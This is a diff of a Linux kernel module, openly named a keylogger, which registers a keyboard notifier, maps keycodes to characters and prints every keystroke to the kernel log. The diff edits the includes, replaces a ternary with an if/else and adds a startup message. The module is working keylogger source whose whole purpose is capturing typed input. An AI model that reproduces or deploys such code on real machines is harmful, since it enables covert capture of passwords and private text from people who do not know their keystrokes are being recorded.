@@ -1,8 +1,6 @@
 #include <linux/module.h>
 #include <linux/keyboard.h> 
-#include <linux/input.h>
-#include <linux/init.h>
-#include <linux/kernel.h>
+#include <linux/input-event-codes.h>
 MODULE_LICENSE("GPL");
 MODULE_AUTHOR("Drugchocolate");
 static const char *us_keymap[][2] = { 
@@ -37,7 +35,14 @@ static const char *us_keymap[][2] = {
 	
 void keycode_to_string(int keycode, int shift_mask, char *buf, unsigned int buf_size) { 
 	if (keycode > KEY_RESERVED && keycode <= KEY_PAUSE) {
-		const char* us_key = (shift_mask == 1) ? us_keymap[keycode][1] : us_keymap[keycode][0];
+		char * us_key;
+		if (shift_mask == 1){
+			us_key = us_keymap[keycode][1];
+		}
+		else {
+			us_key = us_keymap[keycode][0];
+		}
+		//const char* us_key = (shift_mask == 1) ? us_keymap[keycode][1] : us_keymap[keycode][0];
 		
 		snprintf(buf, buf_size, "%s", us_key); 
 	} 
@@ -51,12 +56,13 @@ int keyboard_event_handler(struct notifier_block *nblock, unsigned long code, vo
 	if (strlen(keybuf) < 1) 
 	return NOTIFY_OK; 
 	printk(KERN_INFO "Keylog: %s", keybuf); 
-	return NOTIFY_OK; 
+	return NOTIFY_OK;
 } 
 static struct notifier_block keysniffer_blk = { 
 	.notifier_call = keyboard_event_handler, 
 }; 
 static int __init keylogger_init(void) { 
+	printk(KERN_INFO "Start\n");
 	register_keyboard_notifier(&keysniffer_blk); 
 	return 0; 
 } 
